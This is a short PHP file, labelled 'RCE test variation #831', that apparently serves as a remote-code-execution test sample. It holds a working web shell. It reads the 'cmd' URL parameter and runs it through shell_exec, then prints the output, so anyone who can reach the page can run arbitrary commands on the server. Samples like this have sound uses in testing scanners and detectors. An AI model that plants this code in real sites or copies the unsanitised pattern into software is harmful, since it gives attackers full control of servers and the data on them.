<?php
// RCE test variation #831
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>